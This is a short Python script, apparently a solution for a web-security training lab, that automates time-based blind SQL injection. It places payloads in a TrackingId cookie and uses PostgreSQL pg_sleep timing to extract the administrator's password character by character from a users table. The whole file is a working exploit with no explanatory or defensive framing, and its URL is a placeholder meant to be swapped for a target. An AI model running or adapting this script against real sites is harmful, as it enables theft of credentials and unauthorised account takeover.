from base_password_cracker_class import BasePasswordCracker
import requests
import time

class TimeDelayLab(BasePasswordCracker):
    def __init__(self, url):
        super().__init__(url)
        self.request_time = 0
        self.sleep_time = 2

    def make_request(self, cookie_value):
        cookies = {'TrackingId': cookie_value}
        start = time.time()
        requests.get(self.url, cookies=cookies)
        self.request_time = time.time() - start
        return None

    def build_cookie_exact_match(self):
        return f"'||(select case when password = '{self.password}' then pg_sleep({self.sleep_time}) else '' end from users where username = 'administrator')--"

    def build_cookie_guess_password(self, character):
        return f"'||(select case when password like '{self.password + character}%25' then pg_sleep({self.sleep_time}) else '' end from users where username = 'administrator')--"

    def password_exists(self, _):
        return self.request_time >= self.sleep_time
    
if __name__=="__main__":
    # Adapt Url
    url = "https://example.com/"
    cracker = TimeDelayLab(url)
    cracker.crack_password()